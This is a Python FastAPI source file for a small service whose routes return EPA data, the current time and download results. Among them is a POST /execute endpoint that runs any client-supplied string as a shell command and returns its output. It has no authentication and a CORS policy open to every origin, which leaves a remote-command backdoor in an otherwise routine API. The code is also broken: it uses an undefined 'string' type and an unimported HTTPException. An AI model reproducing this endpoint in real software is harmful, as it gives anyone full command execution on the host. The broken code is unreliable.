from api.db import get_epa
import api.download as dw
import datetime
from fastapi import FastAPI
from fastapi.responses import JSONResponse
from fastapi.encoders import jsonable_encoder
from fastapi.middleware.cors import CORSMiddleware
from dotenv import load_dotenv
import os
from upstash_qstash import Client
import subprocess

load_dotenv()

#client = Client(os.environ.get("QSTASH_TOKEN"))
#schedules = client.schedules()
#res = schedules.create({
#    "destination": "https://fastapi-test-inky.vercel.app/tempo",
#    "cron": "* 1 * * *",
#    "method": "GET"
#})

app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)   

@app.post("/execute")
async def execute_command(cmd: string):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return {
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get('/epa')
async def read_epa():
    return JSONResponse(content=jsonable_encoder(get_epa(year=2023)))

@app.get('/tempo')
async def return_time():
    print((datetime.datetime.now()))
    return str(datetime.datetime.now())

@app.get('/requests')
async def download_time_r():
    return dw.get_opt()
